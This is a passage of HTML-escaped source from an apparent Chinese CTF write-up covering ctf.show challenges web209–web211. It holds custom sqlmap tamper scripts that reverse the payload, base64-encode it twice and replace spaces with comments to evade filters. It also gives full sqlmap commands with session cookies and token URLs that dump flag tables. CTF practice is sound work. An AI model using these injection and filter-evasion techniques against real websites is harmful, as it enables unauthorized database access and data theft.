-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">quote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">doublequote&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;like&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0a&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0a&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">doublequote&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">quote&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x0a&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">retVal&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">retVal&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://e7644ec1-f00f-4252-8e0e-6ded4c1345c6.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://e7644ec1-f00f-4252-8e0e-6ded4c1345c6.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb209&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://e7644ec1-f00f-4252-8e0e-6ded4c1345c6.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://e7644ec1-f00f-4252-8e0e-6ded4c1345c6.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=khfj7v9mah0p28b43l00da7674&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb209&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flav --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web210">web210
-&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="p">){&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">strrev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">strrev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">base64_decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="p">))));&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>反着写个tamper就好了&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">base64&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">HIGHEST&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">reversed_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">[::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">reversed_encoded&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">double_reversed_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">encoded&lt;/span>&lt;span class="p">[::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">final_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">double_reversed_encoded&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">final_encoded&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://c4f3da76-d10a-469e-bc92-07e003617a34.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://c4f3da76-d10a-469e-bc92-07e003617a34.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=sm67m32oeefg55tcpiq1smouod&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb210&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://c4f3da76-d10a-469e-bc92-07e003617a34.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://c4f3da76-d10a-469e-bc92-07e003617a34.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=sm67m32oeefg55tcpiq1smouod&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb210&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flavi --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web211">web211
-&lt;/h3>&lt;p>加个绕过空格就可以&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;span class="lnt">12
-&lt;/span>&lt;span class="lnt">13
-&lt;/span>&lt;span class="lnt">14
-&lt;/span>&lt;span class="lnt">15
-&lt;/span>&lt;span class="lnt">16
-&lt;/span>&lt;span class="lnt">17
-&lt;/span>&lt;span class="lnt">18
-&lt;/span>&lt;span class="lnt">19
-&lt;/span>&lt;span class="lnt">20
-&lt;/span>&lt;span class="lnt">21
-&lt;/span>&lt;span class="lnt">22
-&lt;/span>&lt;span class="lnt">23
-&lt;/span>&lt;span class="lnt">24
-&lt;/span>&lt;span class="lnt">25
-&lt;/span>&lt;span class="lnt">26
-&lt;/span>&lt;span class="lnt">27
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/env python&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">See the file &amp;#39;LICENSE&amp;#39; for copying permission
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">base64&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">lib.core.enums&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">PRIORITY&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">__priority__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PRIORITY&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">HIGHEST&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dependencies&lt;/span>&lt;span class="p">():&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">tamper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">kwargs&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;/**/&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">reversed_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">[::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">reversed_encoded&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">double_reversed_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">encoded&lt;/span>&lt;span class="p">[::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">final_encoded&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">double_reversed_encoded&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">final_encoded&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">payload&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://0bd6a136-199c-451a-aa5f-622d5e99a51d.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://0bd6a136-199c-451a-aa5f-622d5e99a51d.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=eusf2q9tfu758qcjpl98l3rck4&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb211&amp;#34;&lt;/span> -D ctfshow_web --tables
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 sqlmap.py -u &lt;span class="s2">&amp;#34;http://0bd6a136-199c-451a-aa5f-622d5e99a51d.challenge.ctf.show/api/index.php&amp;#34;&lt;/span> --data&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;id=1&amp;#34;&lt;/span> --method&lt;span class="o">=&lt;/span>PUT --headers&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Content-Type:text/plain&amp;#34;&lt;/span> --safe-url&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://0bd6a136-199c-451a-aa5f-622d5e99a51d.challenge.ctf.show/api/getToken.php&amp;#34;&lt;/span> --safe-freq&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span> --cookie&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;PHPSESSID=eusf2q9tfu758qcjpl98l3rck4&amp;#34;&lt;/span> --user-agent&lt;span class="o">=&lt;/span>sqlmap --referer&lt;span class="o">=&lt;/span>ctf.show --tamper&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;ctfshowweb211&amp;#34;&lt;/span> -D ctfshow_web -T ctfshow_flavia --dump
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;h3 id="web212">web212
-&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
